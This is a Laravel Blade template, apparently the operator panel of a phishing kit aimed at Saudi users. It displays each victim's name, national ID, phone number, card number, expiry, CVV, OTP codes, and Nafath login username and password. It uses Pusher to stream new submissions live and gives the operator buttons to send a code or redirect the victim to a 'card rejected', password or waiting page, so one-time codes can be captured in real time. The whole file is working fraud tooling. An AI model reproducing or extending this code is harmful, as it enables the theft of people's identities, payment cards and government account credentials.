{{-- <x-app-layout>
  <x-slot name="header">
    <h2 class="font-semibold text-xl text-gray-800 leading-tight">
      {{ __('Dashboard') }}
    </h2>
  </x-slot>

  <div class="py-12">
    <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
      <div class="bg-white overflow-hidden shadow-xl sm:rounded-lg">
        <x-welcome />
      </div>
    </div>
  </div>
</x-app-layout> --}}
@extends('layouts.dashboard')
@section('styles')
<style>
  .user-action {
    background: #3F6791;
    color: white;
    border: none !important;
  }

  .user-action:hover {
    color: white
  }
</style>
@endsection
@section('content')
<!-- Main content -->
<section class="content">


  <div class="container-fluid">
    <!-- START ALERTS AND CALLOUTS -->
    <div class="row">
      <div class="col-md-12">
        <div class="card card-default">
          <div class="card-header">
            <h3 class="card-title">
              <span id="name">
                <svg width="23px" height="23px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                  <g id="SVGRepo_iconCarrier">
                    <path
                      d="M16 7C16 9.20914 14.2091 11 12 11C9.79086 11 8 9.20914 8 7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7Z"
                      stroke="#adb5bd" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                    <path d="M12 14C8.13401 14 5 17.134 5 21H19C19 17.134 15.866 14 12 14Z" stroke="#adb5bd"
                      stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                  </g>
                </svg>
                <span class="ml-1">{{$notification->name}}</span>
              </span>
            </h3>
          </div>
          <div class="notificationsList">
            @if($notification->step_number >=12)
            @if($notification->nafad_id)
            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> قام بإرسال معرف نفاذ </h5>
              <div class="direct-chat-text pb-4">
                <p><strong class="fs-3 border p-1 rounded">Id:</strong> {{$notification->nafad_id}}</p>
                <div class="d-flex  flex-wrap gap-4">
                  <a class="user-action  border p-2 mx-2 my-2 rounded" style="" href="#" data-action="send-code">إرسال
                    الرمز</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                    صفحة بطاقة مرفوضة</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                    الى الانتظار</a>
                </div>
              </div>
            </div>
            <hr>
            @endif
            @if($notification->nafad_username)
            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> أرسل اسم المستخدم وكلمة السر الخاص بنفاذ </h5>
              <div class="direct-chat-text">
                <p><strong class="fs-3 border p-1 rounded">Username:</strong> {{$notification->nafad_username}}</p>
                <p><strong class="fs-3 border p-1 rounded">Password:</strong> {{$notification->nafad_password}}</p>
                <div class="d-flex  flex-wrap gap-4">
                  <a class="user-action  border p-2 mx-2 my-2 rounded" style="" href="#" data-action="send-code">إرسال
                    الرمز</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                    صفحة بطاقة مرفوضة</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                    الى الانتظار</a>
                </div>
              </div>
            </div>
            <hr>
            @endif
            @endif
            @if($notification->step_number >=10)
            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> أرسل معلومات شبكة الجوال </h5>
              <div class="direct-chat-text">
                <p><strong class="fs-3 border p-1 rounded">Phone:</strong> {{$notification->phone_number_2}}</p>
                <p><strong class="fs-3 border p-1 rounded">Provider:</strong> {{$notification->phone_provider}}</p>
                <p><strong class="fs-3 border p-1 rounded">Code:</strong> {{$notification->phone_code}}</p>
              </div>
            </div>
            <hr>
            @endif
            @if($notification->step_number >=6)
            @if($notification->paymentCard)
            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
              <div class="direct-chat-text">
                <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->otp_code}}</p>
              </div>
            </div>
            <hr>

            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> قام بإرسال بيانات الدفع </h5>
              <div class="direct-chat-text">
                <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->cname}}</p>
                <p><strong class="fs-3 border p-1 rounded">Number:</strong> {{$notification->paymentCard->cnmbr}}</p>
                <p><strong class="fs-3 border p-1 rounded">Date:</strong>
                  {{$notification->paymentCard->year.'-'.$notification->paymentCard->month}}</p>
                <p><strong class="fs-3 border p-1 rounded">CV:</strong> {{$notification->paymentCard->resume}}</p>
              </div>
            </div>
            <hr>
            @endif

            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> دخل الى صفحة الدفع</h5>
            </div>
            <hr>
            @endif
            @if($notification->step_number >= 4)
            <div class="card-body">
              <div>
                <h5><i class="icon fas fa-check"></i> قام بإرسال بياناته</h5>
                <div class="direct-chat-text">
                  <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->people_name}}</p>
                  <p><strong class="fs-3 border p-1 rounded">National ID:</strong> {{$notification->natID}}</p>
                  <p><strong class="fs-3 border p-1 rounded">Phone:</strong> {{$notification->phone}}</p>
                </div>
              </div>
            </div>
            <hr>
            @endif
            @if($notification->step_number >= 2)
            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> دخل الى صفحة البيانات الشخصية</h5>
            </div>
            <hr>
            @endif

            <div class="card-body">
              <h5><i class="icon fas fa-check"></i> دخل الى الصفحة الرئيسية</h5>
            </div>
            <hr>


          </div>

        </div>
        <!-- /.card -->
      </div>
      <!-- /.col -->
    </div>
    <!-- /.row -->
  </div>
</section>
@endsection
@section('scripts')

<script>
  var id ={{$notification->id}}
  Pusher.logToConsole = true;

  // var pusher = new Pusher('119332eca087a1d4c34fb', {
  // cluster: 'ap2'
  // });
  var pusher = new Pusher('2fa3b52f022492400aa0', {
    cluster: 'mt1'
  });

  var channelNotification = pusher.subscribe('send-notification');
  channelNotification.bind('App\\Events\\SendNotification', function(dataP) {

    const nname = document.getElementById('notiName'+dataP.people_id);
    nname.innerText = dataP.name;

    const npage = document.getElementById('notiPage'+dataP.people_id);
    npage.innerText = dataP.page;

    const ndate = document.getElementById('notiDate'+dataP.people_id);
    ndate.innerText = dataP.date;

    const ncount = document.getElementById('notiCount'+dataP.people_id);
    ncount.innerText = dataP.count;

    playNotificationAudio();

  });

  var channelVisit = pusher.subscribe('send-visit');
  channelVisit.bind('App\\Events\\SendVisit', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
            <div>
              <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            </div>
        </div>
        <hr>
      `);
      playNotificationAudio();
    }
  });

  var channelPeople = pusher.subscribe('send-people');
  channelPeople.bind('App\\Events\\SendPeople', function(dataP)
  {
    if(dataP.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataP.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataP.name+`</p>
            <p><strong class="fs-3 border p-1 rounded">National ID:</strong> `+dataP.natID+`</p>
            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> `+dataP.phone+`</p>
          </div>
        </div><hr>
      `);

      const elementName = document.getElementById("name");
      elementName.innerText = " "+dataP.name;

      playDataAudio();
    }
  });

  var channelPart = pusher.subscribe('send-part');
  channelPart.bind('App\\Events\\SendPart', function(dataPr)
  {
    if(dataPr.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataPr.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.cname+`</p>
            <p><strong class="fs-3 border p-1 rounded">Number:</strong> `+dataPr.cnmbr+`</p>
            <p><strong class="fs-3 border p-1 rounded">Date:</strong> `+dataPr.exDate+`</p>
            <p><strong class="fs-3 border p-1 rounded">CV:</strong> `+dataPr.resume+`</p>
          </div>
        </div><hr>
      `);
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.otp_code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelVern = pusher.subscribe('send-vern');
  channelVern.bind('App\\Events\\SendVern', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataV.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelAuth = pusher.subscribe('send-auth');
  channelAuth.bind('App\\Events\\SendAuth', function(dataA)
  {
    if(dataA.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataA.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });
  var channelNafad = pusher.subscribe('send-nafad-id');
  channelNafad.bind('App\\Events\\SendNafadId', function(dataA)
  {
    if(dataA.people_id == id)
    {
      if(dataA.nafad_id)
      {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Id:</strong> `+dataA.nafad_id+`</p>
            <div class="d-flex  flex-wrap gap-4">
                  <a class="user-action  border p-2 mx-2 my-2 rounded" style="" href="#" data-action="send-code">إرسال
                    الرمز</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                    صفحة بطاقة مرفوضة</a>
                    <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                    الى الانتظار</a>
                </div>
          </div>
        </div><hr>
      `);
      }
      else
      {
        $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Username:</strong> `+dataA.nafad_username+`</p>
            <p><strong class="fs-3 border p-1 rounded">Password:</strong> `+dataA.nafad_password+`</p>
            <div class="d-flex  flex-wrap gap-4">
                  <a class="user-action  border p-2 mx-2 my-2 rounded" style="" href="#" data-action="send-code">إرسال
                    الرمز</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                    صفحة بطاقة مرفوضة</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                    الى الانتظار</a>
                </div>
          </div>
        </div><hr>
      `);
      }

      playDataAudio();
    }
  });

  var channelAuth = pusher.subscribe('send-phone-data');
  channelAuth.bind('App\\Events\\SendPhoneData', function(dataA)
  {
    if(dataA.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> `+dataA.phone_number_2+`</p>
            <p><strong class="fs-3 border p-1 rounded">Provider:</strong> `+dataA.phone_provider+`</p>
            <p><strong class="fs-3 border p-1 rounded">Code:</strong> `+dataA.phone_code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });
  // var channel = pusher.subscribe('send-code');
  // channel.bind('App\\Events\\SendCode', function(data) {
  //   // setTimeout (function() {
  //   //   let code = prompt("Please enter the code");
  //   //   sendCode(data.people_id,code)
  //   // },5000);

  // });
  $(document).on('click','.user-action',function(e){
    e.preventDefault();
    let action = $(this).data('action');
    var visitor_id = {{$notification->id}}
    if(action == "send-code")
    {
      let code = prompt("Please enter the code");
      sendCode({{$notification->id}},code)
    }
    else
    {
      if(action =='redirect-final')
      {
        let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة بطاقة مرفوضة')
        if(confirm)
        {
          $.ajax({
            url: "/redirect-user",
            type: "POST",
            data: {
              "_token": $('meta[name=csrf-token]').attr('content'),
                visitor_id: visitor_id,
                redirect_url: "redirect-final",
            },
            success: function(response) {
                console.log(response);
            },
            error: function(xhr, status, error) {
                console.log(error);
            }
          });
        }
        return true;
      }
      if(action =='redirect-password')
      {
        let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة كلمة المرور')
        if(confirm)
        {
          $.ajax({
            url: "/redirect-user",
            type: "POST",
            data: {
              "_token": $('meta[name=csrf-token]').attr('content'),
                visitor_id: visitor_id,
                redirect_url: "redirect-password",
            },
            success: function(response) {
                console.log(response);
            },
            error: function(xhr, status, error) {
                console.log(error);
            }
          });
        }
        return true;
      }
      if(action =='redirect-waiting')
      {
        let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة الانتظار')
        if(confirm)
        {
          $.ajax({
          url: "/redirect-user",
          type: "POST",
          data: {
            "_token": $('meta[name=csrf-token]').attr('content'),
              visitor_id: visitor_id,
              redirect_url: "redirect-waiting",
          },
          success: function(response) {
              console.log(response);
          },
          error: function(xhr, status, error) {
              console.log(error);
          }
        });
       }
       return true;
      }

    }
  })
  function sendCode(visitor_id,code) {
      $.ajax({
          url: "/send-code",
          type: "POST",
          data: {
            "_token": $('meta[name=csrf-token]').attr('content'),
              visitor_id: visitor_id,
              code: code
          },
          success: function(response) {
              console.log(response);
          },
          error: function(xhr, status, error) {
              console.log(error);
          }
      });
    }
</script>
@endsection